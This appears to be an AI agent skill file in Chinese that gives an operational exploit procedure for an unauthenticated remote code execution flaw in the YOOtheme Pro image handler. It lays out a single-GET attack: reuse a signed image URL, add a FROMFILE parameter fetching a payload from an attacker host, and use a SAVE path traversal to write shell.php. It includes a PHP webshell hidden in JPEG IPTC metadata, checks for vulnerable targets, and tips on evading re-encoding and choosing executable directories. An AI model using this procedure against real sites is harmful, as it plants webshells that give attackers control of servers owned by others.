---
name: yootheme-pro-image-handler-rce
description: "Use when 打 YOOtheme Pro：签名图片处理器未授权 RCE。"
---

# YOOtheme Pro 图片处理器签名不全 → 未授权单 GET RCE（CVE-2026-102785）

**CVSS 10.0**，CWE-434。影响 **YOOtheme Pro 5.0.0 – 5.0.52**（WordPress 与 Joomla 两端）。**Unit 42 确认 2026-10-26 已在野利用**，补丁发布后两天自动扫描器就开始播 webshell。修在 **5.0.53**（2026-10-21），无 workaround。

源：`al4n4n/CVE-2026-102785`。

## 漏洞本体：签名只管一半

图片变换处理器（动态缩放/裁剪/转格式）的 URL 用 `hash=` 签名防滥用。但**签名校验未覆盖完整操作列表**——两个未文档化参数不参与签名：

- `FROMFILE=` 从**任意 URL** 拉源图，而不是本地文件系统
- `SAVE=` 控制**输出写到哪里**

两者都不在 hash 范围内 → 保留合法 hash，想加什么加什么。

## 一步 RCE（单个 GET，零凭据）

```
1. 打开目标站任意公开页，从 <img> / CSS background-image / OpenGraph 里抓一条带 hash= 的签名图片 URL
2. 保留原 hash 参数不动
3. 追加 &FROMFILE=http://attacker/payload.jpg     ← polyglot
4. 追加 &SAVE=../../wp-content/uploads/shell.php ← 穿越出 cache 目录到可执行路径
```

处理器把 polyglot 写到磁盘为 `.php`，访问即执行。

## 关键构造：PHP 藏在 JPEG 的 IPTC Caption

不是塞文件尾、不是改注释段——写在 **IPTC 元数据 record 2 / dataset 120**（字节标记 `\x1c\x02\x78`，即 Caption/Description）：

```
\x1c\x02\x78 <len_hi> <len_lo> <?php system($_GET['c']); ?>
```

**这一位能存活图片重编码**——处理器会真的解码再编码一次图，普通注释段被洗掉，IPTC 字段保留。选位比构造更重要。

## 判据

- YOOtheme Pro 版本 **5.0.0–5.0.52**（`wp-content/themes/yootheme/` 下 `style.css` 有 `Version:`）
- 判定存在性：任意页面有带 `hash=` 的图片 URL，且追加 `FROMFILE=` 不被 403/签名校验拒 → 面开通
- 响应里 `SAVE` 路径的写入回显或后续访问 `.php` 返回 200 → 成立

## 可迁移的三条

1. **签名覆盖范围审计**：签名/校验只针对已知参数时，枚举未文档化参数（`FROMFILE`/`SAVE`/`DEST`/`OUTPUT`/`CALLBACK` 这类动词名）逐个追加。签名正确≠参数集完整——这是签名类防护的通病。
2. **图片 polyglot 的持久位**：IPTC Caption（`\x1c\x02\x78`）、XMP、EXIF UserComment 这三处能熬过重编码；文件尾追加、JPEG COM 段、PNG tEXt 大多被洗。
3. **`SAVE` 类参数 = 写路径控制**：任何「输出到」参数都试 `../` 穿越 + 写进可执行后缀。

## 坑

- `hash` 必须用**目标站真实页面里的**，自己算不出来。先抓一条再改参数。
- WordPress 默认 `.php` 在 `wp-content/uploads/` 不执行（部分主机除外）——优先指到主题/插件目录或已有可执行目录。
- 重编码会洗掉普通 payload 位置，必须用 IPTC。
- 5.0.53 是硬分界；更早版本无绕过补丁，只能升。
